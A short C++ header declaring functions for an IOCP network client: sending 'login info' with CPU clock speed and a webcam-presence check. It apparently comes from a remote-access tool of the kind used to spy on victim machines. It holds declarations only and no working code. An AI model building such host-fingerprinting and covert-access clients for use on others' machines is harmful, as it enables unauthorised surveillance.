#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
